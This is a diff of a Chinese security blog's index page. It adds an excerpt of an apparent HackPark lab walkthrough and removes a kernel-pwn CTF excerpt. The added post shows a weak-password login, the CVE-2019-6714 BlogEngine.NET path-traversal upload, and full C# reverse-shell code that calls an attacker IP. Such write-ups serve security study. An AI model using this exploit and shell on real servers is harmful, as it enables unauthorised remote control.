@@ -137,6 +137,93 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2024/07/18/HackPark/" title="踩到猫了">HackPark</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-07-18  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p><img src="/Red_FILE/48b909034099d6a6ef9a4f80719bf65d_MD5.jpeg"></p>
+<p>只开了80和3389端口</p>
+<p>一个登录界面<br><img src="/Red_FILE/192635cd562ac8547a8652c5429e2237_MD5.jpeg"><br>爆一下弱口令，运气不错~：<code>admin:1qaz2wsx</code><br><img src="/Red_FILE/9d2e663b0406290262abb4905b2d1fa7_MD5.jpeg"></p>
+<p>登录后台，使用的框架是 BlogEngine.NET 3.3.6.0<br><img src="/Red_FILE/cdfa836ce2695885b360eef7e0afac0d_MD5.jpeg"></p>
+<p>searchsploit 有历史CVE，CVE-2019-6714<br><img src="/Red_FILE/e3d669d666d559346ec7757c4a84c9cf_MD5.jpeg"></p>
+<p>msf并没有自动利用的脚本，直接手撸吧，漏洞点在 theme 模块。在文章发布页面 （&#x2F;admin&#x2F;app&#x2F;editor&#x2F;editpost.cshtml） 可以上传一个 PostView.ascx 格式的 webshell，然后访问 &#x2F;?theme&#x3D;..&#x2F;..&#x2F;App_Data&#x2F;files 激活<br><img src="/Red_FILE/69f3f8074d78ffb7b88bb8d76d0ce2a8_MD5.jpeg"><br><img src="/Red_FILE/536ccdfbaa739cda90c35da8dbc1e852_MD5.jpeg"></p>
+<pre class="line-numbers language-csharp" data-language="csharp"><div class="caption"><span>TI:"PostView.ascx"</span></div><code class="language-csharp"><span class="token operator">&lt;</span><span class="token operator">%</span>@ <span class="token class-name">Control</span> Language<span class="token operator">=</span><span class="token string">"C#"</span> AutoEventWireup<span class="token operator">=</span><span class="token string">"true"</span> EnableViewState<span class="token operator">=</span><span class="token string">"false"</span> Inherits<span class="token operator">=</span><span class="token string">"BlogEngine.Core.Web.Controls.PostViewBase"</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>@ <span class="token class-name">Import</span> Namespace<span class="token operator">=</span><span class="token string">"BlogEngine.Core"</span> <span class="token operator">%</span><span class="token operator">></span>
+
+<span class="token operator">&lt;</span><span class="token class-name">script</span> runat<span class="token operator">=</span><span class="token string">"server"</span><span class="token operator">></span>
+	<span class="token keyword">static</span> <span class="token class-name">System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>StreamWriter</span> streamWriter<span class="token punctuation">;</span>
+
+    <span class="token keyword">protected</span> <span class="token keyword">override</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">OnLoad</span><span class="token punctuation">(</span><span class="token class-name">EventArgs</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">OnLoad</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token keyword">using</span><span class="token punctuation">(</span><span class="token class-name">System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TcpClient</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TcpClient</span><span class="token punctuation">(</span><span class="token string">"10.11.84.153"</span><span class="token punctuation">,</span> <span class="token number">4445</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		<span class="token keyword">using</span><span class="token punctuation">(</span><span class="token class-name">System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>Stream</span> stream <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">GetStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+			<span class="token keyword">using</span><span class="token punctuation">(</span><span class="token class-name">System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>StreamReader</span> rdr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>StreamReader</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+				streamWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>StreamWriter</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
+						
+				<span class="token class-name">StringBuilder</span> strInput <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+				<span class="token class-name">System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>Process</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>Process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+				p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>FileName <span class="token operator">=</span> <span class="token string">"cmd.exe"</span><span class="token punctuation">;</span>
+				p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>CreateNoWindow <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+				p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>UseShellExecute <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+				p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardOutput <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+				p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardInput <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+				p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardError <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+				p<span class="token punctuation">.</span>OutputDataReceived <span class="token operator">+=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>DataReceivedEventHandler</span><span class="token punctuation">(</span>CmdOutputDataHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
+				p<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+				p<span class="token punctuation">.</span><span class="token function">BeginOutputReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+				<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+					strInput<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>rdr<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+					p<span class="token punctuation">.</span>StandardInput<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>strInput<span class="token punctuation">)</span><span class="token punctuation">;</span>
+					strInput<span class="token punctuation">.</span><span class="token function">Remove</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> strInput<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>
+				<span class="token punctuation">&#125;</span>
+			<span class="token punctuation">&#125;</span>
+		<span class="token punctuation">&#125;</span>
+    	<span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">CmdOutputDataHandler</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">object</span></span> sendingProcess<span class="token punctuation">,</span> <span class="token class-name">System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>DataReceivedEventArgs</span> outLine<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   	<span class="token class-name">StringBuilder</span> strOutput <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+       	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>String<span class="token punctuation">.</span><span class="token function">IsNullOrEmpty</span><span class="token punctuation">(</span>outLine<span class="token punctuation">.</span>Data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+       		<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+                	strOutput<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>outLine<span class="token punctuation">.</span>Data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    	streamWriter<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>strOutput<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    	streamWriter<span class="token punctuation">.</span><span class="token function">Flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
+<span class="token operator">&lt;</span>asp<span class="token punctuation">:</span><span class="token class-name">PlaceHolder</span> ID<span class="token operator">=</span><span class="token string">"phContent"</span> runat<span class="token operator">=</span><span class="token string">"server"</span> EnableViewState<span class="token operator">=</span><span class="token string">"false"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>asp<span class="token punctuation">:</span>PlaceHolder<span class="token operator">></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>成功反弹shell<br><img src="/Red_FILE/7e2075335b9e6db1f1de19824553a7e1_MD5.jpeg"></p>
+<p>x64 的 win server 2012<br><img src="/Red_FILE/f265b6ae28e465c4f6af68e04120b9a3_MD5.jpeg"></p>
+	
+	</div>
+  <a type="button" href="/2024/07/18/HackPark/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2024/07/17/Vulnhub-GOLDENEYE/" >Vulnhub-GOLDENEYES</a>
 		</h3>
 		</div>
@@ -927,70 +1014,6 @@ No RELRO        Canary found      NX disabled   REL             No RPATH   No RU
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/04/02/Pwnhub 2023三月公开赛 kheap/" title="kpwn题集">Pwnhub 2023三月公开赛 kheap</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-04-02  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p><del>现在看来其实是送分题</del></p>
-</blockquote>
-<h1 id="一、逆向分析"><a href="#一、逆向分析" class="headerlink" title="一、逆向分析"></a>一、逆向分析</h1><h2 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
-qemu-system-x86_64 <span class="token punctuation">\</span>
-    <span class="token parameter variable">-m</span> 128M <span class="token punctuation">\</span>
-    <span class="token parameter variable">-kernel</span> ./bzImage <span class="token punctuation">\</span>
-    <span class="token parameter variable">-initrd</span> ./rootfs.cpio <span class="token punctuation">\</span>
-    <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>
-    <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 oops=panic panic=1 kaslr quiet"</span> <span class="token punctuation">\</span>
-    <span class="token parameter variable">-cpu</span> kvm64,+smep <span class="token punctuation">\</span>
-    <span class="token parameter variable">-smp</span> <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">2</span>,threads<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">\</span>
-    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>
-    <span class="token parameter variable">-s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>开了kaslr、smep，经过实验也开启了PTI</p>
-<h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/sh</span>
-
-mount <span class="token operator">-</span>t proc none <span class="token operator">/</span>proc
-mount <span class="token operator">-</span>t sysfs none <span class="token operator">/</span>sys
-mount <span class="token operator">-</span>t devtmpfs devtmpfs <span class="token operator">/</span>dev
-
-<span class="token keyword">exec</span> <span class="token number">0</span><span class="token operator">&lt;</span><span class="token operator">/</span>dev<span class="token operator">/</span>console
-<span class="token keyword">exec</span> <span class="token number">1</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span>console
-<span class="token keyword">exec</span> <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span>console
-
-insmod <span class="token operator">/</span>lib<span class="token operator">/</span>module<span class="token operator">/</span>kheap<span class="token punctuation">.</span>ko
-chmod <span class="token number">666</span> <span class="token operator">/</span>dev<span class="token operator">/</span>kheap 
-chmod <span class="token number">600</span> flag
-
-setsid cttyhack setuidgid <span class="token number">1000</span> sh
-
-umount <span class="token operator">/</span>proc
-umount <span class="token operator">/</span>sys
-poweroff <span class="token operator">-</span>d <span class="token number">0</span>  <span class="token operator">-</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="kheap-ko"><a href="#kheap-ko" class="headerlink" title="kheap.ko"></a>kheap.ko</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
-No RELRO        Canary found      NX disabled   REL             No RPATH   No RUNPATH   <span class="token number">61</span><span class="token punctuation">)</span> Symbols	  No	<span class="token number">0</span>		<span class="token number">0</span>		./kheap.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>开了canary</p>
-	
-	</div>
-  <a type="button" href="/2024/04/02/Pwnhub 2023三月公开赛 kheap/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -1044,7 +1067,7 @@ No RELRO        Canary found      NX disabled   REL             No RPATH   No RU
 		
 			<li><a href="/categories/赛题/">赛题<span>10</span></a></li>
 		
-			<li><a href="/categories/进攻性渗透测试/">进攻性渗透测试<span>9</span></a></li>
+			<li><a href="/categories/进攻性渗透测试/">进攻性渗透测试<span>10</span></a></li>
 		
 		</ul>
 	</div>
@@ -1055,13 +1078,13 @@ No RELRO        Canary found      NX disabled   REL             No RPATH   No RU
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/渗透打靶/">渗透打靶<span>7</span></a></li>
+			<li><a href="/tags/渗透打靶/">渗透打靶<span>8</span></a></li>
 		
-			<li><a href="/tags/Windows-pwn/">Windows pwn<span>1</span></a></li>
+			<li><a href="/tags/IOT/">IOT<span>2</span></a></li>
 		
 			<li><a href="/tags/Linux-Kernel-pwn/">Linux Kernel pwn<span>7</span></a></li>
 		
-			<li><a href="/tags/IOT/">IOT<span>2</span></a></li>
+			<li><a href="/tags/Windows-pwn/">Windows pwn<span>1</span></a></li>
 		
 		 
 		</ul>
@@ -1073,6 +1096,10 @@ No RELRO        Canary found      NX disabled   REL             No RPATH   No RU
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2024/07/18/HackPark/"  title="踩到猫了" ><i class="fa fa-file-o"></i>HackPark</a>
+      </li>
     
       <li>
         <a href="/2024/07/17/Vulnhub-GOLDENEYE/" ><i class="fa fa-file-o"></i>Vulnhub-GOLDENEYES</a>
@@ -1088,10 +1115,6 @@ No RELRO        Canary found      NX disabled   REL             No RPATH   No RU
     
       <li>
         <a href="/2024/07/08/长城杯铁人三项2020 企业环境渗透/"  title="肾透测试" ><i class="fa fa-file-o"></i>长城杯铁人三项2020 企业环境渗透</a>
-      </li>
-    
-      <li>
-        <a href="/2024/06/29/Steel Mountain/" ><i class="fa fa-file-o"></i>Steel Mountain</a>
       </li>
     
   </ul>
